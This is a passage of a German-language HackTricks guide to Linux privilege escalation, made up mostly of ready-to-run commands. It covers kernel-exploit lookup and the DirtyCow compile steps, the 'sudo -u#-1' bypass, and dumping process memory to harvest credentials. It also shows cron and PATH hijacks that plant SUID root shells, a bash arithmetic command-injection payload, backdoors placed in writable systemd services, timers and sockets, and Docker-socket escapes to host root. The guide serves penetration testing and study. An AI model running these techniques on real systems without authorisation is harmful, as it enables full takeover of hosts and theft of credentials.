# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Fangen wir an, Informationen über das laufende OS zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Wenn du Schreibrechte auf einen Ordner innerhalb der `PATH`-Variable hast, kannst du möglicherweise einige libraries oder binaries hijack:
```bash
echo $PATH
```
### Env-Info

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Überprüfe die Kernel-Version und ob es einen Exploit gibt, der zur Eskalation von Privilegien verwendet werden kann.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Du findest eine gute Liste verwundbarer Kernel und einige bereits **compiled exploits** hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) und [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Andere Seiten, auf denen du einige **compiled exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Webseite zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach kernel exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, prüft nur exploits für kernel 2.x)

Suche immer **die kernel version in Google**, vielleicht ist deine kernel version in einem kernel exploit erwähnt und dann kannst du sicher sein, dass dieser exploit gültig ist.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den anfälligen sudo-Versionen, die in:
```bash
searchsploit sudo
```
Du kannst prüfen, ob die sudo-Version anfällig ist, indem du dieses grep verwendest.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg Signaturprüfung fehlgeschlagen

Sieh dir die **smasher2 box of HTB** an, um ein **Beispiel** dafür zu sehen, wie diese vuln ausgenutzt werden könnte.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere System-Enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Verteidigungen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Wenn du dich in einem docker container befindest, kannst du versuchen, daraus zu entkommen:


{{#ref}}
docker-security/
{{#endref}}

## Laufwerke

Überprüfe **was gemountet und nicht gemountet ist**, wo und warum. Wenn etwas nicht gemountet ist, könntest du versuchen, es zu mounten und nach privaten Informationen zu suchen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche Binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **irgendein Compiler installiert ist**. Das ist nützlich, wenn du einen kernel exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn einsetzen willst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Installierte verwundbare Software

Überprüfe die **Version der installierten Pakete und Dienste**. Vielleicht gibt es eine alte Nagios-Version (zum Beispiel), die für escalating privileges ausgenutzt werden könnte…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Beachte, dass diese Befehle viele Informationen anzeigen werden, die größtenteils nutzlos sind; daher wird empfohlen, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die prüfen, ob installierte Softwareversionen gegenüber bekannten Exploits verwundbar sind._

## Prozesse

Schau dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Privilegien hat, als er haben sollte** (vielleicht läuft ein tomcat als root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Auch **prüfe deine Rechte auf die Prozess-Binaries**, vielleicht kannst du welche überschreiben.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Das kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die häufig ausgeführt werden oder wenn bestimmte Voraussetzungen erfüllt sind.

### Prozessspeicher

Einige Dienste auf einem Server speichern **credentials im Klartext im Speicher**.\
Normalerweise benötigst du **root privileges**, um den Speicher von Prozessen zu lesen, die anderen Nutzern gehören; daher ist das meist nützlicher, wenn du bereits root bist und weitere credentials finden möchtest.\
Denke jedoch daran, dass **du als regulärer Benutzer den Speicher der Prozesse lesen kannst, die dir gehören**.

> [!WARNING]
> Beachte, dass heutzutage die meisten Maschinen **ptrace standardmäßig nicht erlauben**, was bedeutet, dass du andere Prozesse, die deinem unprivileged user gehören, nicht dumpen kannst.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: alle Prozesse können debuggt werden, solange sie die gleiche uid haben. Das ist die klassische Art, wie ptracing funktionierte.
> - **kernel.yama.ptrace_scope = 1**: es kann nur ein Parent-Prozess debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: nur admin kann ptrace verwenden, da die CAP_SYS_PTRACE-Fähigkeit erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: keine Prozesse dürfen mit ptrace verfolgt werden. Nach dem Setzen ist ein Reboot notwendig, um ptracing wieder zu ermöglichen.

#### GDB

Wenn du Zugriff auf den Speicher eines FTP-Services (zum Beispiel) hast, könntest du den Heap auslesen und darin nach credentials suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine gegebene Prozess-ID zeigen die **maps, wie der Speicher im virtuellen Adressraum dieses Prozesses abgebildet ist**; sie zeigen auch die **Berechtigungen jeder abgebildeten Region**. Die Pseudo-Datei **mem** legt **den Speicher des Prozesses selbst** offen. Aus der **maps**-Datei wissen wir, welche **Speicherbereiche lesbar sind** und deren Offsets. Wir verwenden diese Informationen, um **in die mem-Datei zu seeken und alle lesbaren Bereiche in eine Datei zu dumpen**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bietet Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann über /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur von **root** und der Gruppe **kmem** lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine für Linux neu gedachte Umsetzung des klassischen ProcDump-Tools aus der Sysinternals-Suite für Windows. Erhältlich unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Werkzeuge

Um den Speicher eines Prozesses auszulesen, kannst du folgende Tools verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Du kannst manuell die root-Anforderungen entfernen und den dir gehörenden Prozess dumpen
- Script A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Credentials aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn du feststellst, dass der authenticator-Prozess läuft:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe frühere Abschnitte, um verschiedene Möglichkeiten zu finden, den Speicher eines Prozesses zu dumpen) und im Speicher nach credentials suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Anmeldeinformationen aus dem Arbeitsspeicher stehlen** und aus einigen **bekannten Dateien**. Es benötigt Root-Rechte, um richtig zu funktionieren.

| Funktion                                          | Prozessname          |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP Basic-Auth-Sitzungen)        | apache2              |
| OpenSSH (aktive SSH-Sitzungen - Sudo-Verwendung)  | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron jobs

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

Wenn ein Web-"Crontab UI" Panel (alseambusher/crontab-ui) als root läuft und nur an Loopback gebunden ist, kannst du es trotzdem über SSH local port-forwarding erreichen und einen privilegierten Job erstellen, um zu eskalieren.

Typischer Ablauf
- Finde nur auf Loopback hörenden Port (z.B., 127.0.0.1:8000) und Basic-Auth-Realm via `ss -ntlp` / `curl -v localhost:8000`
- Finde Zugangsdaten in operativen Artefakten:
- Backups/scripts mit `zip -P <password>`
- systemd unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` exponiert
- Tunnel und Login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Erstelle einen high-priv job und führe ihn sofort aus (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Nutze es:
```bash
/tmp/rootshell -p   # root shell
```
Härtung
- Führen Sie Crontab UI nicht als root aus; beschränken Sie es auf einen dedizierten Benutzer und minimale Berechtigungen
- An localhost binden und zusätzlich den Zugriff über firewall/VPN einschränken; Passwörter nicht wiederverwenden
- Vermeiden Sie das Einbetten von secrets in unit files; verwenden Sie secret stores oder eine root-only EnvironmentFile
- Aktivieren Sie audit/logging für On-Demand-Jobausführungen

Prüfen Sie, ob ein geplanter Job verwundbar ist. Vielleicht können Sie ein von root ausgeführtes Script ausnutzen (wildcard vuln? kann Dateien ändern, die root verwendet? symlinks verwenden? bestimmte Dateien im Verzeichnis erstellen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte auf /home/user hat_)

Wenn in diesem crontab der Benutzer root versucht, einen Befehl oder ein Script auszuführen, ohne den PATH zu setzen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root shell erhalten, indem du:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron, das ein Skript mit einem Wildcard verwendet (Wildcard Injection)

Wenn ein Skript, das als root ausgeführt wird, ein “**\***” in einem Befehl enthält, kannst du dies ausnutzen, um unerwartete Dinge zu bewirken (z. B. privesc). Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn der wildcard einem Pfad wie** _**/some/path/\***_ **vorgeht, ist er nicht verwundbar (selbst** _**./\***_ **nicht).**

Lies die folgende Seite für weitere Tricks zur wildcard-Exploitation:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash führt parameter expansion und command substitution vor der arithmetic evaluation in ((...)), $((...)) und let aus. Wenn ein root cron/parser untrusted Log-Felder einliest und diese in einen arithmetic context einspeist, kann ein Angreifer eine command substitution $(...) injizieren, die beim Ausführen des cron als root ausgeführt wird.

- Warum es funktioniert: In Bash erfolgen die expansions in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, dann word splitting und pathname expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird zuerst substituiert (der Befehl läuft), danach wird die verbleibende numerische `0` für die Arithmetik verwendet, sodass das Script ohne Fehler weiterläuft.

- Typisches verwundbares Muster:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Ausnutzung: Sorge dafür, dass attacker-controlled Text in das geparste Log geschrieben wird, sodass das zahlähnliche Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout ausgibt (oder leite es um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte Script ein **Verzeichnis, auf das Sie vollständigen Zugriff haben**, verwendet, kann es nützlich sein, diesen Ordner zu löschen und einen **symlink-Ordner zu einem anderen** zu erstellen, der ein von Ihnen kontrolliertes Script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Häufige cron jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und escalate privileges.

Zum Beispiel, um **alle 0.1s während 1 Minute zu überwachen**, **nach den am wenigsten ausgeführten Befehlen zu sortieren** und die am häufigsten ausgeführten Befehle zu löschen, kannst du Folgendes tun:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Sie können auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dies wird jeden gestarteten Prozess überwachen und auflisten).

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem man nach einem Kommentar **einen carriage return setzt** (ohne newline character), und der cron job wird funktionieren. Beispiel (beachte das carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Schreibbare _.service_ Dateien

Überprüfe, ob du eine `.service`-Datei schreiben kannst; wenn ja, **könntest du sie ändern**, sodass sie **deine backdoor ausführt, wenn** der Service **gestartet**, **neu gestartet** oder **gestoppt** wird (vielleicht musst du warten, bis die Maschine neu gebootet wird).\
Zum Beispiel erstelle deine backdoor innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Schreibbare service binaries

Beachte, dass wenn du **write permissions over binaries being executed by services** hast, du diese verändern kannst, um backdoors einzuschleusen, sodass beim erneuten Ausführen der services die backdoors ausgeführt werden.

### systemd PATH - Relative Pfade

Du kannst den von **systemd** verwendeten PATH mit folgendem Befehl sehen:
```bash
systemctl show-environment
```
Wenn du feststellst, dass du in einem der Ordner des Pfads **schreiben** kannst, könntest du möglicherweise **Privilegien eskalieren**. Du musst nach **relativen Pfaden, die in Service-Konfigurationsdateien verwendet werden**, suchen, wie:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Erstelle dann ein **ausführbares Programm** mit dem **gleichen Namen wie das relative path binary** im systemd PATH-Ordner, den du beschreiben kannst, und wenn der Service aufgefordert wird, die verwundbare Aktion (**Start**, **Stop**, **Reload**) auszuführen, wird deine **backdoor** ausgeführt (nicht-privilegierte Benutzer können Dienste normalerweise nicht starten/stoppen, prüfe jedoch, ob du `sudo -l` verwenden kannst).

**Erfahre mehr über Dienste mit `man systemd.service`.**

## **Timers**

**Timers** sind systemd-Unit-Dateien, deren Name auf `**.timer**` endet, die `**.service**`-Dateien oder Ereignisse steuern. **Timers** können als Alternative zu cron verwendet werden, da sie eingebaute Unterstützung für kalenderbasierte Zeitereignisse und monotone Zeitereignisse bieten und asynchron ausgeführt werden können.

Du kannst alle Timer mit folgendem Befehl auflisten:
```bash
systemctl list-timers --all
```
### Schreibbare Timer

Wenn du einen Timer ändern kannst, kannst du ihn dazu bringen, einige vorhandene Einheiten von systemd.unit auszuführen (wie eine `.service` oder eine `.target`)
```bash
Unit=backdoor.service
```
In der Dokumentation können Sie nachlesen, was eine Unit ist:

> Die Unit, die aktiviert wird, wenn dieser Timer abläuft. Das Argument ist ein Unit-Name, dessen Suffix nicht ".timer" ist. Falls nicht angegeben, ist dieser Wert standardmäßig ein Service, der denselben Namen wie die Timer-Unit hat, abgesehen vom Suffix. (Siehe oben.) Es wird empfohlen, dass der Unit-Name, der aktiviert wird, und der Unit-Name der Timer-Unit identisch benannt sind, abgesehen vom Suffix.

Daher müssten Sie, um diese Berechtigung auszunutzen, Folgendes tun:

- Finden Sie eine systemd unit (wie eine `.service`), die eine **beschreibbare Binärdatei ausführt**
- Finden Sie eine systemd unit, die einen **relativen Pfad ausführt** und über **Schreibrechte** am **systemd PATH** verfügt (um diese ausführbare Datei zu ersetzen)

**Mehr über Timer erfahren Sie mit `man systemd.timer`.**

### **Timer aktivieren**

Um einen Timer zu aktivieren, benötigen Sie root-Rechte und müssen folgendes ausführen:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Beachte, dass der **timer** durch das Erstellen eines Symlinks zu ihm unter `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` **aktiviert** wird

## Sockets

Unix Domain Sockets (UDS) ermöglichen die **Prozesskommunikation** auf derselben oder auf unterschiedlichen Maschinen innerhalb von Client-Server-Modellen. Sie nutzen standardmäßige Unix-Descriptor-Dateien für die Kommunikation zwischen Computern und werden über `.socket`-Dateien eingerichtet.

Sockets können mit `.socket`-Dateien konfiguriert werden.

**Erfahre mehr über sockets mit `man systemd.socket`.** In dieser Datei können mehrere interessante Parameter konfiguriert werden:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Diese Optionen unterscheiden sich, aber zusammenfassend werden sie verwendet, um **anzugeben, wo gelauscht wird** (der Pfad der AF_UNIX-Socket-Datei, die IPv4/6-Adresse und/oder Portnummer, auf die gelauscht wird, etc.).
- `Accept`: Nimmt ein boolean-Argument. Ist es **true**, wird für jede eingehende Verbindung eine **Service-Instanz erzeugt** und nur die Verbindungs-Socket an diese übergeben. Ist es **false**, werden alle Listening-Sockets selbst an die gestartete Service-Unit übergeben, und es wird nur eine Service-Unit für alle Verbindungen erzeugt. Dieser Wert wird für Datagram-Sockets und FIFOs ignoriert, wo eine einzelne Service-Unit bedingungslos allen eingehenden Verkehr behandelt. **Standardmäßig false**. Aus Leistungsgründen wird empfohlen, neue Daemons so zu schreiben, dass sie für `Accept=no` geeignet sind.
- `ExecStartPre`, `ExecStartPost`: Akzeptiert eine oder mehrere Befehlszeilen, die jeweils **ausgeführt werden, bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **erstellt** und gebunden werden. Das erste Token der Befehlszeile muss ein absoluter Dateiname sein, gefolgt von Argumenten für den Prozess.
- `ExecStopPre`, `ExecStopPost`: Zusätzliche **Befehle**, die jeweils **ausgeführt werden, bevor** bzw. **nachdem** die Listening-**sockets**/FIFOs **geschlossen** und entfernt werden.
- `Service`: Legt den Namen der **service**-Unit fest, die bei **eingehendem Traffic** **aktiviert** werden soll. Diese Einstellung ist nur für Sockets mit Accept=no erlaubt. Standardmäßig ist es der Dienst, der denselben Namen wie die Socket trägt (mit ersetzter Endung). In den meisten Fällen ist es nicht notwendig, diese Option zu verwenden.

### Schreibbare .socket-Dateien

Wenn du eine **schreibbare** `.socket`-Datei findest, kannst du am Anfang der `[Socket]`-Sektion etwas wie `ExecStartPre=/home/kali/sys/backdoor` **hinzufügen**, und die Backdoor wird ausgeführt, bevor die Socket erstellt wird. Daher wirst du **wahrscheinlich warten müssen, bis die Maschine neu gebootet wird.**\
_Notiere, dass das System diese Socket-Dateikonfiguration verwenden muss, sonst wird die Backdoor nicht ausgeführt_

### Schreibbare sockets

Wenn du einen **schreibbaren Socket** findest (_hier geht es jetzt um Unix Sockets und nicht um die Konfigurations-`.socket`-Dateien_), dann **kannst du mit diesem Socket kommunizieren** und möglicherweise eine Verwundbarkeit ausnutzen.

### Auflisten von Unix Sockets
```bash
netstat -a -p --unix
```
### Rohverbindung
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Beachte, dass es einige **sockets listening for HTTP** requests geben kann (_ich meine nicht .socket files, sondern Dateien, die als unix sockets fungieren_). Du kannst das mit folgendem Befehl prüfen:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Wenn der Socket **responds with an HTTP** request, dann kannst du mit ihm **communicate** und vielleicht **exploit some vulnerability**.

### Beschreibbarer Docker Socket

Der Docker socket, häufig zu finden unter `/var/run/docker.sock`, ist eine kritische Datei, die gesichert werden sollte. Standardmäßig ist sie vom `root`-Benutzer und Mitgliedern der `docker`-Gruppe beschreibbar. Das Vorhandensein von write access zu diesem Socket kann zu privilege escalation führen. Hier eine Aufschlüsselung, wie das gemacht werden kann und alternative Methoden, falls die Docker CLI nicht verfügbar ist.

#### **Privilege Escalation with Docker CLI**

Wenn du write access auf den Docker socket hast, kannst du escalate privileges mit den folgenden Befehlen:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Diese Befehle erlauben es Ihnen, einen Container mit Root-Zugriff auf das Dateisystem des Hosts zu starten.

#### **Direkte Verwendung der Docker API**

In Fällen, in denen die Docker CLI nicht verfügbar ist, kann der Docker-Socket weiterhin über die Docker API und `curl`-Befehle manipuliert werden.

1.  **Docker-Images auflisten:** Holen Sie die Liste der verfügbaren Images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Einen Container erstellen:** Senden Sie eine Anfrage, um einen Container zu erstellen, der das Root-Verzeichnis des Hosts einbindet.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Starten Sie den neu erstellten Container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **An den Container anhängen:** Verwenden Sie `socat`, um eine Verbindung zum Container herzustellen, wodurch die Ausführung von Befehlen darin möglich wird.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nachdem die `socat`-Verbindung hergestellt wurde, können Sie Befehle direkt im Container mit Root-Zugriff auf das Dateisystem des Hosts ausführen.

### Andere

Beachten Sie, dass wenn Sie Schreibberechtigungen für den docker-Socket haben, weil Sie **in der Gruppe `docker`** sind, Sie [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Wenn die [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Siehe **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

